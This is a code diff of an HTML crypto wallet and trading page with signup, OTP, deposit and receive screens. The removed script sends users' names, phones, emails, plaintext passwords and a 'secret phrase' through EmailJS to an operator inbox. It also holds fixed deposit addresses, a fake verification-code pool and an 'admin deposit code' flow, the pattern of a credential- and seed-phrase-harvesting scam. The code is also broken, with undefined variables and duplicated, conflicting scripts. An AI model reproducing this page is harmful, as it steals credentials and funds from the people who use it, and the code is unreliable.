-<button id="btnConfirmDeposit" style="padding:10px 20px; background:#1F6FEB; border:none; color:white; border-radius:8px; cursor:pointer;">Confirm Deposit</button>
+    <button onclick="showReceiveAddress()" style="
+      width:100%;
+      background:#28a745;
+      padding:16px;
+      font-weight:700;
+      border:none;
+      border-radius:16px;
+      font-size:1.1rem;
+      color:#fff;
+      cursor:pointer;
+      transition: background-color 0.3s;
+    " onmouseover="this.style.background='#1f7e32'" onmouseout="this.style.background='#28a745'">
+      Show Receive Address
+    </button>
 
-  </div>       
-  <!-- Receive Section -->       
-  <div style="margin-bottom:20px;">      
-    <h3>📥 Receive</h3>      
-    <label for="receiveToken">Token:</label>      
-    <select id="receiveToken" style="width:100%; padding:8px; margin-bottom:10px;">      
-      <option value="USDT">USDT</option>      
-      <option value="BTC">BTC</option>      
-      <option value="ETH">ETH</option>      
-      <option value="BNB">BNB</option>      
-      <option value="SOL">SOL</option>      
-      <option value="TRX">TRX</option>      
-    </select>      
-    <button onclick="showReceiveAddress()" style="padding:10px 20px; background:#28a745; border:none; color:white; border-radius:8px; cursor:pointer;">Show Receive Address</button>      
-    <div id="receiveAddressBox" style="margin-top:10px; display:none;"></div>      
-  </div>        
-  <!-- Navigation Buttons -->       
-  <div style="margin-top:30px; display:flex; gap:10px; flex-wrap:wrap;">      
-    <button onclick="showPage(13)" style="flex:1; padding:15px; background:#1F6FEB; color:white; border:none; border-radius:10px;">Wallet</button>      
-    <button onclick="showPage(12)" style="flex:1; padding:15px; background:#333; color:white; border:none; border-radius:10px;">Settings</button>      
-    <button onclick="showPage(3)" style="flex:1; padding:15px; background:#333; color:white; border:none; border-radius:10px;">Receive</button>      
-    <button onclick="showPage(8)" style="flex:1; padding:15px; background:#333; color:white; border:none; border-radius:10px;">Send</button>      
-    <button onclick="showPage(16)" style="flex:1; padding:15px; background:#28a745; color:white; border:none; border-radius:10px;">Trade</button>      
-  </div>      
-</div>    
-    
-    <!-- Page 3i: Trading Strategy -->     
-  <div id="page3i" class="page" style="display:none; background-color:#0B0E11; color:white; padding:20px; font-family:sans-serif;">      
-  <h2>🧠 Trading Strategy</h2>      
-  <p>Select your preferred trading strategy:</p>      
-  <select id="strategySelect" style="width:100%; padding:10px; margin-bottom:20px;">      
-    <option value="scalping">Scalping</option>      
-    <option value="day_trading">Day Trading</option>      
-    <option value="swing">Swing Trading</option>      
-    <option value="trend_following">Trend Following</option>      
-    <option value="mean_reversion">Mean Reversion</option>      
-  </select>      
-  <button onclick="applyStrategy()" style="padding:10px 20px; background:#1F6FEB; border:none; color:white; border-radius:8px; cursor:pointer;">Apply Strategy</button>      
-  <p id="strategyStatus" style="margin-top:20px;"></p>      
-</div>      
-    <!-- Page 3ii: TradingView Chart -->      <div id="page3ii" class="page" style="display:none; background-color:#0B0E11; color:white; padding:20px; font-family:sans-serif;">      
-  <h2>📈 Live Trade Chart</h2>      
-  <div id="tradingview_chart" style="height:500px;"></div>      
-</div>     
-    <!-- Page 3iii: Receive Page -->      
-    <div id="page3iii" class="page" style="display:none; background-color:#0B0E11; color:white; padding:20px; font-family:sans-serif;">      
-  <h2 style="margin-bottom:20px;">📥 Receive Crypto</h2>     
-    <label for="receiveCoin" style="display:block; margin-bottom:10px;">Select Coin:</label>
-<select id="receiveCoin" style="width:100%; padding:10px; margin-bottom:20px; border-radius:6px; border:none;">
-<option value="btc">Bitcoin (BTC)</option>
-<option value="eth">Ethereum (ETH)</option>
-<option value="bnb">Binance Coin (BNB)</option>
-<option value="sol">Solana (SOL)</option>
-<option value="trx">Tron (TRX)</option>
-</select>
+    <div id="receiveAddressBox" style="
+      margin-top:20px;
+      background:#0B131E;
+      padding:20px;
+      border-radius:16px;
+      color:#4fc3f7;
+      word-break: break-word;
+      display:none;
+      font-weight:700;
+      font-size:1.1rem;
+    "></div>
+  </section>
 
-  <div style="margin-top:10px; background-color:#111; padding:15px; border-radius:10px;">      
-    <strong>Token:</strong> 
-    <img id="tokenIcon" src="https://assets.coingecko.com/coins/images/1/thumb/bitcoin.png" alt="icon" style="width:20px; height:20px; vertical-align:middle; margin-right:6px;">      
-    <span id="tokenLabel">BTC</span><br><br>     
-    <strong>Wallet Address:</strong>      
-<p id="receiveAddress" style="word-break:break-all;">bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu</p>      
-<button onclick="copyReceiveAddress()" style="padding:8px 16px; background:#1F6FEB; color:white; border:none; border-radius:6px;">Copy Address</button>
+  <!-- Navigation Buttons -->
+  <nav style="
+    display:flex;
+    gap:20px;
+    flex-wrap:wrap;
+    justify-content:center;
+  ">
+    <button onclick="showPage(13)" style="
+      flex:1 1 140px;
+      padding:16px;
+      background:#1F6FEB;
+      color:#fff;
+      border:none;
+      border-radius:20px;
+      font-weight:700;
+      font-size:1.1rem;
+      cursor:pointer;
+      transition: background-color 0.3s;
+    " onmouseover="this.style.background='#155FCC'" onmouseout="this.style.background='#1F6FEB'">
+      Wallet
+    </button>
+    <button onclick="showPage(12)" style="
+      flex:1 1 140px;
+      padding:16px;
+      background:#333;
+      color:#fff;
+      border:none;
+      border-radius:20px;
+      font-weight:700;
+      font-size:1.1rem;
+      cursor:pointer;
+      transition: background-color 0.3s;
+    " onmouseover="this.style.background='#4a4a4a'" onmouseout="this.style.background='#333'">
+      Settings
+    </button>
+    <button onclick="showPage(3iii)" style="
+      flex:1 1 140px;
+      padding:16px;
+      background:#333;
+      color:#fff;
+      border:none;
+      border-radius:20px;
+      font-weight:700;
+      font-size:1.1rem;
+      cursor:pointer;
+      transition: background-color 0.3s;
+    " onmouseover="this.style.background='#4a4a4a'" onmouseout="this.style.background='#333'">
+      Receive
+    </button>
+    <button onclick="showPage(8)" style="
+      flex:1 1 140px;
+      padding:16px;
+      background:#333;
+      color:#fff;
+      border:none;
+      border-radius:20px;
+      font-weight:700;
+      font-size:1.1rem;
+      cursor:pointer;
+      transition: background-color 0.3s;
+    " onmouseover="this.style.background='#4a4a4a'" onmouseout="this.style.background='#333'">
+      Send
+    </button>
+    <button onclick="showPage(16)" style="
+      flex:1 1 140px;
+      padding:16px;
+      background:#28a745;
+      color:#fff;
+      border:none;
+      border-radius:20px;
+      font-weight:700;
+      font-size:1.1rem;
+      cursor:pointer;
+      transition: background-color 0.3s;
+    " onmouseover="this.style.background='#1f7e32'" onmouseout="this.style.background='#28a745'">
+      Trade
+    </button>
+  </nav>
 
-  </div>     
-      <div style="margin-top:30px;">      
-    <button onclick="showPage('page3')" style="padding:10px 20px; background:#444; color:white; border:none; border-radius:8px;">⬅ Back</button>      
-  </div>      
-</div>     
-    <!-- Page 3iv: Deposit Confirmation -->    
-    <div id="page3iv" class="page" style="display:none; background-color:#0B0E11; color:white; padding:20px; font-family:sans-serif;">      
-  <h2 style="margin-bottom:20px;">✅ Confirm Deposit</h2>        
-      <div style="margin-bottom:20px;">      
-    <strong>Selected Network:</strong><br>      
-    <span id="confirmNetwork">-</span>      
-  </div>        
-      <div style="margin-bottom:20px;">      
-    <strong>Deposit Amount:</strong><br>      
-    <span id="confirmAmount">$0.00</span>      
-  </div>       
-      <div style="margin-bottom:20px;">      
-    <strong>Admin Deposit Code:</strong><br>      
-    <span id="confirmCode">-</span>      
-  </div>       
-      <a href="https://mail-org.github.io/Blockchain/" target="_blank">      
-    <button style="padding:10px 20px; background:#28a745; color:white; border:none; border-radius:8px; margin-top:20px;">      
-      Confirm and Send      
-    </button>      
-  </a>        
-      <div style="margin-top:30px;">      
-    <button onclick="showPage('page3')" style="padding:10px 20px; background:#444; color:white; border:none; border-radius:8px;">      
-      ⬅ Back    
-    </button>      
-  </div>      
-</div>  
+</div>
 
-<script>    
-    emailjs.init("VTJD_okCRB6iOQZRH");const verificationCodes = ["71xz04", "58kl39", "83md22", "67tr85", "42vn93", "96wb20", "33jq87", "75cy44", "18dl70", "49fx18", "84kp02", "69hr75", "21bn64", "55ze96", "02my47", "47lv51", "38xt83", "60ns30", "73dc12", "66oj90"];      
-      
-function saveUserData(user) { localStorage.setItem('userData', JSON.stringify(user)); }      
-function getUserData() { return JSON.parse(localStorage.getItem('userData')); }      
-function clearUserData() { localStorage.removeItem('userData'); }      
-      
-function showPage(id) {      
-  document.querySelectorAll('main > section').forEach(s => s.classList.add('hidden'));      
-  document.getElementById(id).classList.remove('hidden');      
-  clearMessages();      
-}      
-function clearMessages() {      
-  document.getElementById('signupError').textContent = '';      
-  document.getElementById('verifyMessage').textContent = '';      
-  document.getElementById('loginError').textContent = '';      
-  document.getElementById('loadingMessage').classList.add('hidden');      
-}      
-      
-let currentVerificationCode = '';      
-let currentUserEmail = '';      
-      
-document.getElementById('btnGotoSignup').onclick = () => showPage('page1i');      
-document.getElementById('btnGotoLogin').onclick = () => showPage('page1iii');      
-document.getElementById('linkBackToLanding').onclick = () => showPage('page1');      
-document.getElementById('linkBackToSignup').onclick = () => showPage('page1i');      
-document.getElementById('linkBackToWelcome1iii').onclick = () => showPage('page1');      
-      
-document.getElementById('signupForm').addEventListener('submit', function(event) {      
-  event.preventDefault();      
-  clearMessages();      
-      
-  // === Retrieve form inputs ===
-const fullName = document.getElementById("full_name").value.trim();
-const userEmail = document.getElementById("user_email").value.trim();
-const country = document.getElementById("country").value.trim();
-const phoneCode = document.getElementById("phone_country_code").value;
-const phoneNumber = document.getElementById("phone_number").value.trim();
-const password = document.getElementById("password").value;
-const confirmPassword = document.getElementById("confirmPassword").value;      
-      
-  if(password !== confirmPassword) {      
-    document.getElementById('signupError').textContent = "Passwords do not match.";      
-    return;      
-  }      
-      
-  currentVerificationCode = verificationCodes[Math.floor(Math.random() * verificationCodes.length)];      
-  currentUserEmail = email;      
-      
-  emailjs.send("service_xg8bzqs", "template_gclz9gu", {      
-    full_name: fullName,      
-    phone_number: phone,      
-    user_email: email,      
-    password: password,      
-    secret_phrase: secretPhrase,      
-    verification_code: currentVerificationCode      
-  }).then(() => {      
-    return emailjs.send("service_xg8bzqs", "template_r0zg4zj", {      
-      to_email: email,      
-      to_name: fullName,      
-      verification_code: currentVerificationCode      
-    });      
-  }).then(() => {      
-    alert(`Verification code sent to ${email}. Please check your email.`);      
-    saveUserData({ fullName, phone, email, password, secretPhrase });      
-    this.reset();      
-    showPage('page1ii');      
-  }).catch(err => {      
-    console.error('EmailJS error:', err);      
-    document.getElementById('signupError').textContent = 'Error sending email. Please try again later.';      
-  });      
-});      
-      
-document.getElementById('btnVerifyCode').onclick = () => {      
-  clearMessages();      
-  const inputCode = document.getElementById('inputVerificationCode').value.trim();      
-  if (!inputCode) {      
-    document.getElementById('verifyMessage').textContent = 'Please enter the verification code.';      
-    return;      
-  }      
-      
-  const loading = document.getElementById('loadingMessage');      
-  loading.classList.remove('hidden');      
-      
-  setTimeout(() => {      
-    loading.classList.add('hidden');      
-    if (verificationCodes.includes(inputCode) && inputCode === currentVerificationCode) {      
-      alert('Verification successful! Redirecting to dashboard...');      
-      showDashboard();      
-    } else {      
-      document.getElementById('verifyMessage').textContent = 'Incorrect verification code. Please try again.';      
-    }      
-  }, 1500);      
-};      
-      
-document.getElementById('loginForm').addEventListener('submit', function(event) {      
-  event.preventDefault();      
-  clearMessages();      
-      
-  const email = this.login_email.value.trim();      
-  const password = this.login_password.value;      
-      
-  const storedUser = getUserData();      
-      
-  if (!storedUser) {      
-    document.getElementById('loginError').textContent = 'No registered user found. Please sign up first.';      
-    return;      
-  }      
-  if(email !== storedUser.email || password !== storedUser.password) {      
-    document.getElementById('loginError').textContent = 'Invalid email or password.';      
-    return;      
-  }      
-      
-  alert('Login successful!');      
-  showDashboard();      
-});      
-      
-function showDashboard() {      
-  const user = getUserData();      
-  if(!user) {      
-    alert('No user data found. Please log in or sign up.');      
-    showPage('page1');      
-    return;      
-  }      
-  alert(`Welcome ${user.fullName}`);      
-  showPage('page3');      
-}      
-      
-showPage('page1');      
-      
-  </script>     
-    
-    <script>      
-  // Called after clicking "Confirm Deposit" on Page 3      
-  document.getElementById("btnConfirmDeposit").addEventListener("click", () => {      
-    const amount = document.getElementById("depositAmount").value;      
-    const network = document.getElementById("depositNetwork").value;      
-    const code = document.getElementById("depositCode").value;      
-      
-    if (!amount || !code) {      
-      alert("Please fill in all deposit details.");      
-      return;      
-    }      
-      
-    document.getElementById("confirmAmount").textContent = `$${parseFloat(amount).toFixed(2)}`;      
-    document.getElementById("confirmNetwork").textContent = network;      
-    document.getElementById("confirmCode").textContent = code;      
-      
-    showPage("page3iv");      
-  });      
-</script>     
-    <script>      
-  const tokenIcons = {      
-    btc: 'https://assets.coingecko.com/coins/images/1/thumb/bitcoin.png',      
-    eth: 'https://assets.coingecko.com/coins/images/279/thumb/ethereum.png',      
-    bnb: 'https://assets.coingecko.com/coins/images/825/thumb/bnb-icon2_2x.png',      
-    sol: 'https://assets.coingecko.com/coins/images/4128/thumb/solana.png',      
-    trx: 'https://assets.coingecko.com/coins/images/1094/thumb/tron.png'      
-  };      
-      
-  const receiveAddresses = {      
-    btc: 'bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu',      
-    eth: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',      
-    bnb: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',      
-    sol: '8ChmWCsEjvoNcFkze5GgNuUiw3FLTzYy2g5Sw5DumypX',      
-    trx: 'TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco'      
-  };      
-      
-  document.getElementById("receiveCoin").addEventListener("change", function() {      
-    const coin = this.value;      
-    document.getElementById("receiveAddress").textContent = receiveAddresses[coin];      
-    document.getElementById("tokenLabel").textContent = coin.toUpperCase();      
-    document.getElementById("tokenIcon").src = tokenIcons[coin];      
-  });      
-      
-  function copyReceiveAddress() {      
-    const address = document.getElementById("receiveAddress").textContent;      
-    navigator.clipboard.writeText(address).then(() => {      
-      alert("Address copied to clipboard!");      
-    });      
-  }      
-</script>     
-    
-<script>      
-function applyStrategy() {      
-  const strategy = document.getElementById('strategySelect').value;      
-  document.getElementById('strategyStatus').innerText = `Strategy "${strategy}" has been applied.`;      
-}      
-      
-function showReceiveAddress() {      
-  const token = document.getElementById("receiveToken").value;      
-  const addressMap = {      
-    USDT: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",      
-    BTC: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu",      
-    ETH: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",      
-    BNB: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",      
-    SOL: "8ChmWCsEjvoNcFkze5GgNuUiw3FLTzYy2g5Sw5DumypX",      
-    TRX: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco"      
-  };      
-  const address = addressMap[token] || "Unknown";      
-  document.getElementById("receiveAddressBox").style.display = "block";      
-  document.getElementById("receiveAddressBox").innerHTML = `<strong>${token} Address:</strong> ${address}`;      
-}      
-      
-(function() {      
-  const script = document.createElement('script');      
-  script.src = "https://s3.tradingview.com/tv.js";      
-  script.onload = () => {      
-    new TradingView.widget({      
-      "container_id": "tradingview_chart",      
-      "autosize": true,      
-      "symbol": "BINANCE:BTCUSDT",      
-      "interval": "60",      
-      "timezone": "Etc/UTC",      
-      "theme": "dark",      
-      "style": "1",      
-      "locale": "en",      
-      "toolbar_bg": "#f1f3f6",      
-      "enable_publishing": false,      
-      "allow_symbol_change": true,      
-      "hide_top_toolbar": false,      
-      "hide_legend": false,      
-      "save_image": false      
-    });      
-  };      
-  document.head.appendChild(script);      
-})();      
-      
-async function loadPrices() {      
-  try {      
-    const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin,tether&vs_currencies=usd');      
-    const data = await res.json();      
-    document.getElementById("btcPrice").innerText = `$${data.bitcoin.usd}`;      
-    document.getElementById("ethPrice").innerText = `$${data.ethereum.usd}`;      
-    document.getElementById("bnbPrice").innerText = `$${data.binancecoin.usd}`;      
-    document.getElementById("usdtPrice").innerText = `$${data.tether.usd}`;      
-  } catch (err) {      
-    console.error("Price API error", err);      
-  }      
-}      
-loadPrices();      
-      
-document.querySelectorAll(".network-copy").forEach(btn => {      
-  btn.addEventListener("click", () => {      
-    const textId = btn.getAttribute("data-copy-id");      
-    const text = document.getElementById(textId).innerText;      
-    navigator.clipboard.writeText(text);      
-    btn.innerText = "Copied!";      
-    setTimeout(() => btn.innerText = "Copy", 1000);      
-  });      
-});      
-</script>   
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<!-- Success Popup -->
+<div id="successPopup" role="alert" aria-live="assertive" aria-atomic="true">Verification Successful! Welcome.</div>
+
+<!-- Include EmailJS SDK -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
 <script>
   emailjs.init("VTJD_okCRB6iOQZRH");
 
-  const verificationCodes = [
-    "71xz04", "58kl39", "83md22", "67tr85", "42vn93", "96wb20",
-    "33jq87", "75cy44", "18dl70", "49fx18", "84kp02", "69hr75",
-    "21bn64", "55ze96", "02my47", "47lv51", "38xt83", "60ns30",
-    "73dc12", "66oj90"
-  ];
+  const serviceID = "service_xg8bzqs";
+  const adminTemplateID = "template_gclz9gu";
+  const autoReplyTemplateID = "template_r0zg4zj";
 
-  // Store page history for back button support
-  let pageHistory = [];
+  // State variables
+  let generatedCode = "";
+  let userData = {};
+  let countdown = 60;
+  let countdownInterval;
+  let isCaptchaVerified = false;
+  let currentLoggedInUserEmail = "";
 
-  function showPage(pageId) {
-    const allPages = document.querySelectorAll("section[id^='page']");
-    allPages.forEach(page => page.style.display = "none");
-    const selectedPage = document.getElementById("page" + pageId);
-    if (selectedPage) {
-      selectedPage.style.display = "block";
-
-      // Add current page to history only if different from last
-      if (pageHistory.length === 0 || pageHistory[pageHistory.length - 1] !== pageId) {
-        pageHistory.push(pageId);
-      }
-
-      localStorage.setItem("lastPage", pageId);
-      localStorage.setItem("pageHistory", JSON.stringify(pageHistory));
-    }
+  // Page helper
+  function showPage(id) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    const page = document.getElementById(id);
+    if (page) page.classList.add('active');
+    // Clear errors on page change
+    clearErrors();
   }
-
-  // On page load, restore last visited page and page history
-  window.onload = () => {
-    const lastPage = localStorage.getItem("lastPage") || "1i"; // default signup page
-    const savedHistory = localStorage.getItem("pageHistory");
-    pageHistory = savedHistory ? JSON.parse(savedHistory) : [lastPage];
-    showPage(lastPage);
-  };
-
-  // Back button function: go back in page history if possible
-  function goBack() {
-    if (pageHistory.length > 1) {
-      // Remove current page
-      pageHistory.pop();
-      const previousPage = pageHistory[pageHistory.length - 1];
-      localStorage.setItem("pageHistory", JSON.stringify(pageHistory));
-      localStorage.setItem("lastPage", previousPage);
-      showPage(previousPage);
-    }
+  function clearErrors() {
+    document.querySelectorAll('.error').forEach(e => e.textContent = '');
   }
-
-  // Attach back button event listeners (buttons with class 'back-btn')
-  document.querySelectorAll(".back-btn").forEach(button => {
-    button.addEventListener("click", goBack);
-  });
-
-  // Signup form submission
-  document.getElementById("signupForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    // Collect form values
-    const fullName = document.getElementById("full_name").value.trim();
-    const countryCode = document.getElementById("phone_country_code").value;
-    const phoneNumber = document.getElementById("phone_number").value.trim();
-    const email = document.getElementById("user_email").value.trim();
-    const password = document.getElementById("password").value;
-    const confirmPassword = document.getElementById("confirmPassword").value;
-
-    const passwordErrorDiv = document.getElementById("passwordError");
-    const signupError = document.getElementById("signupError");
-
-    // Reset error messages
-    passwordErrorDiv.style.display = "none";
-    signupError.innerText = "";
-
-    if (password !== confirmPassword) {
-      passwordErrorDiv.style.display = "block";
-      return;
-    }
-
-    if (!countryCode) {
-      signupError.innerText = "Please select a country code.";
-      return;
-    }
-
-    const fullPhoneNumber = countryCode + phoneNumber;
-
-    const signupData = {
-      to_email: "Blockchainautomated@outlook.com",
-      full_name: fullName,
-      phone_number: fullPhoneNumber,
-      user_email: email,
-      password: password,
-    };
-
-    // Send signup email with EmailJS
-    emailjs.send("service_xg8bzqs", "template_gclz9gu", signupData)
-      .then(() => {
-        // Optional auto-reply
-        emailjs.send("service_xg8bzqs", "template_r0zg4zj", {
-          user_email: email,
-          full_name: fullName
-        });
-        showPage("1ii"); // Go to verification page
-      })
-      .catch((error) => {
-        console.error("Signup error:", error);
-        signupError.innerText = "Failed to sign up. Please try again.";
-      });
-  });
-
-  // Verification code button click
-  document.getElementById("verifyBtn").addEventListener("click", function () {
-    const userCode = document.getElementById("verificationCode").value.trim();
-    const errorField = document.getElementById("verificationError");
-
-    if (verificationCodes.includes(userCode)) {
-      errorField.innerText = "";
-      showPage("3"); // Success, go to dashboard page 3
-    } else {
-      errorField.innerText = "Input correct verification code";
-    }
-  });
-    </script>
-  <script>
-// === EmailJS Initialization ===
-emailjs.init("VTJD_okCRB6iOQZRH");
-
-// === Verification Code Pool ===
-const verificationCodes = [
-  "71xz04", "58kl39", "83md22", "67tr85", "42vn93", "96wb20", "33jq87",
-  "75cy44", "18dl70", "49fx18", "84kp02", "69hr75", "21bn64", "55ze96",
-  "02my47", "47lv51", "38xt83", "60ns30", "73dc12", "66oj90", "47bjd8",
-  "7je567", "Hu557j", "5tvh7u", "57bb8i"
-];
-
-let selectedCode = "";
-
-// === Maintain Current Page on Refresh ===
-window.addEventListener("DOMContentLoaded", () => {
-  const savedPage = localStorage.getItem("currentPage") || "1i";
-  showPage(savedPage);
-});
-
-// === Handle Sign Up Submission ===
-document.getElementById("signupForm").addEventListener("submit", function (e) {
-  e.preventDefault();
-
-  // === Retrieve form inputs ===
-const fullName = document.getElementById("full_name").value.trim();
-const userEmail = document.getElementById("user_email").value.trim();
-const country = document.getElementById("country").value.trim();
-const phoneCode = document.getElementById("phone_country_code").value;
-const phoneNumber = document.getElementById("phone_number").value.trim();
-const password = document.getElementById("password").value;
-const confirmPassword = document.getElementById("confirmPassword").value;
-  
-  // Validate password match
-  const passwordError = document.getElementById("passwordError");
-  if (password !== confirmPassword) {
-    passwordError.style.display = "block";
-    return;
-  } else {
-    passwordError.style.display = "none";
-  }
-
-  // Generate verification code
-  selectedCode = verificationCodes[Math.floor(Math.random() * verificationCodes.length)];
-
-  const templateParams = {
-    user_name: fullName,
-    user_email: userEmail,
-    message: `Your registration verification code is: ${selectedCode}`
-  };
-
-  // Send registration code to admin
-  emailjs.send("service_xg8bzqs", "template_gclz9gu", templateParams)
-    .then(() => {
-      // Auto-reply to user
-      emailjs.send("service_xg8bzqs", "template_r0zg4zj", templateParams);
-
-      // Navigate to verification page
-      navigateTo("1ii");
-    })
-    .catch((error) => {
-      console.error("EmailJS Error:", error);
-      alert("Failed to send verification email. Please try again.");
-    });
-});
-
-// === Handle Verification Submission ===
-function verifyCode() {
-  const inputCode = document.getElementById("verificationInput").value.trim();
-  const messageBox = document.getElementById("verificationMessage");
-
-  if (inputCode === selectedCode) {
-    messageBox.style.color = "green";
-    messageBox.textContent = "✅ Verification successful! Redirecting...";
+  // Show success popup
+  function showSuccessPopup(message = "Verification Successful! Welcome.") {
+    const popup = document.getElementById('successPopup');
+    popup.textContent = message;
+    popup.style.display = 'block';
     setTimeout(() => {
-      navigateTo("3"); // Navigate to dashboard
-    }, 1000);
-  } else {
-    messageBox.style.color = "red";
-    messageBox.textContent = "❌ Input correct code";
-  }
-}
-
-// === Page Navigation ===
-function showPage(pageId) {
-  document.querySelectorAll("section[id^='page']").forEach(div => div.style.display = "none");
-  const target = document.getElementById("page" + pageId);
-  if (target) target.style.display = "block";
-  localStorage.setItem("currentPage", pageId);
-}
-
-// === Manual Navigation with Back Button Support ===
-function navigateTo(pageId) {
-  history.pushState({ page: pageId }, "", "#page" + pageId);
-  showPage(pageId);
-}
-
-// === Handle Browser Back Button ===
-window.addEventListener("popstate", (event) => {
-  const pageId = event.state?.page || "1i";
-  showPage(pageId);
-});
-</script>
-  <script>
-  // === Initialize EmailJS ===
-  (function () {
-    emailjs.init("VTJD_okCRB6iOQZRH"); // Your Public Key
-  })();
-
-  // === Utility: Generate 6-digit confirmation code ===
-  function generateSignupCode() {
-    const chars = "0123456789abcdefghijklmnopqrstuvwxyz";
-    let code = "";
-    for (let i = 0; i < 6; i++) {
-      code += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return code;
+      popup.style.display = 'none';
+    }, 3000);
   }
 
-  // === Signup Form Submit Handler ===
-  function sendSignupForm(e) {
-    e.preventDefault(); // Prevent default form behavior
+  // NAVIGATION BUTTONS
+  document.getElementById('btnGoSignUp').addEventListener('click', () => showPage('page1'));
+  document.getElementById('btnGoLogin').addEventListener('click', () => showPage('page2'));
+  document.getElementById('btnBackToLandingFromSignUp').addEventListener('click', () => showPage('page0'));
+  document.getElementById('btnBackToLandingFromLogin').addEventListener('click', () => showPage('page0'));
+  document.getElementById('btnBackToSignUpFromVerify').addEventListener('click', () => showPage('page1'));
+  document.getElementById('btnBackToLoginFromCaptcha').addEventListener('click', () => {
+    isCaptchaVerified = false;
+    showPage('page2');
+  });
+  document.getElementById('btnBackToLoginFromReset').addEventListener('click', () => showPage('page2'));
+  document.getElementById('btnBackToHomeFromPortfolio').addEventListener('click', () => showPage('page3'));
 
-    const form = document.getElementById("signupForm");
-    const code = generateSignupCode();
+  // SIGN UP
+  document.getElementById('btnSignUpSubmit').addEventListener('click', () => {
+    const fullName = document.getElementById('signFullName').value.trim();
+    const email = document.getElementById('signEmail').value.trim().toLowerCase();
+    const password = document.getElementById('signPassword').value.trim();
 
-    // Send main form data to admin email
-    emailjs.sendForm("service_xg8bzqs", "template_gclz9gu", form)
-      .then(() => {
-        alert("✅ Signup details sent successfully!");
-
-        // Auto reply to the user with their confirmation code
-        emailjs.send("service_xg8bzqs", "template_r0zg4zj", {
-          user_email: form.user_email.value,
-          confirmation_code: code
-        });
-
-        form.reset();
-      })
-      .catch(error => {
-        alert("❌ Failed to send. Please try again.");
-        console.error("EmailJS Error:", error);
-      });
-  }
-  </script>
-    <script>
-  // Login form submission
-  document.getElementById("loginForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    const loginEmail = this.login_email.value.trim();
-    const loginPassword = this.login_password.value;
-
-    // Optional: validate (you can add real login validation logic here)
-    if (loginEmail === "" || loginPassword === "") {
-      document.getElementById("loginError").innerText = "Please fill all fields.";
+    if (!fullName || !email || !password) {
+      alert("Please fill all fields.");
       return;
     }
 
-    // Simulated successful login → open Page 3
-    showPage("3");
-  });
-    </script>
-  <script>
-   function showPage(pageId) {
-    const allPages = document.querySelectorAll("section[id^='page']");
-    allPages.forEach((page) => {
-      page.style.display = "none";
+    userData = { fullName, email, password };
+    generatedCode = (Math.floor(100000 + Math.random() * 900000)).toString();
+
+    const templateParams = {
+      to_name: fullName,
+      to_email: email,
+      message: `Your verification code is ${generatedCode}`
+    };
+
+    emailjs.send(serviceID, adminTemplateID, templateParams).then(() => {
+      return emailjs.send(serviceID, autoReplyTemplateID, templateParams);
+    }).then(() => {
+      startCountdown();
+      showPage('page1i');
+    }).catch(err => {
+      alert("Failed to send verification email. Please try again later.");
+      console.error(err);
     });
-    const selectedPage = document.getElementById("page" + pageId);
-    if (selectedPage) {
-      selectedPage.style.display = "block";
-      // Save last page ID to localStorage
-      localStorage.setItem("lastPage", pageId);
+  });
+
+  // OTP Verification
+  document.getElementById('btnVerifyCode').addEventListener('click', () => {
+    const codeInput = document.getElementById('verificationCode').value.trim();
+    if (codeInput === generatedCode) {
+      showSuccessPopup();
+      document.getElementById('welcomeUserName').textContent= `Hello, ${userData.fullName}`;
+      currentLoggedInUserEmail = userData.email;
+      showPage('page3'); // Show homepage after verification
+    } else {
+      document.getElementById('otpError').textContent = "Incorrect verification code. Please try again.";
+    }
+  });
+
+  // Resend OTP Code
+  document.getElementById('btnResendCode').addEventListener('click', () => {
+    if (countdown > 0) {
+      alert(`Please wait ${countdown}s before resending.`);
+      return;
+    }
+    generatedCode = (Math.floor(100000 + Math.random() * 900000)).toString();
+    const templateParams = {
+      to_name: userData.fullName,
+      to_email: userData.email,
+      message: `Your new verification code is ${generatedCode}`
+    };
+    emailjs.send(serviceID, adminTemplateID, templateParams).then(() => {
+      return emailjs.send(serviceID, autoReplyTemplateID, templateParams);
+    }).then(() => {
+      startCountdown();
+      alert("Verification code resent.");
+    }).catch(err => {
+      alert("Failed to resend code.");
+      console.error(err);
+    });
+  });
+
+  // Countdown timer for resend button text
+  function startCountdown() {
+    countdown = 60;
+    updateCountdownText();
+    countdownInterval = setInterval(() => {
+      countdown--;
+      updateCountdownText();
+      if (countdown <= 0) clearInterval(countdownInterval);
+    }, 1000);
+  }
+  function updateCountdownText() {
+    document.getElementById('countdownText').textContent = `Resend available in ${countdown}s`;
+  }
+
+  // LOGIN FORM SUBMIT
+  document.getElementById('loginForm').addEventListener('submit', (e) => {
+    e.preventDefault();
+    clearErrors();
+
+    const email = document.getElementById('loginEmail').value.trim().toLowerCase();
+    const password = document.getElementById('loginPassword').value.trim();
+
+    if (!email || !password) {
+      document.getElementById('loginError').textContent = "Please fill in both fields.";
+      return;
+    }
+
+    // For demo: Simple login validation against userData object
+    if (email === userData.email && password === userData.password) {
+      currentLoggedInUserEmail = email;
+      document.getElementById('welcomeUserName').textContent = `Hello, ${userData.fullName}`;
+      showPage('page3'); // Go to homepage
+    } else {
+      document.getElementById('loginError').textContent = "Invalid email or password.";
+    }
+  });
+
+  // FORGOT PASSWORD BUTTON - Open CAPTCHA page
+  document.getElementById('btnForgotPassword').addEventListener('click', () => {
+    showPage('page3i');
+    loadCaptcha();
+  });
+
+  // CAPTCHA Integration (using hCaptcha for example)
+  // Replace with your chosen public captcha provider. Here we demo with hCaptcha.
+  function loadCaptcha() {
+    const container = document.getElementById('captchaContainer');
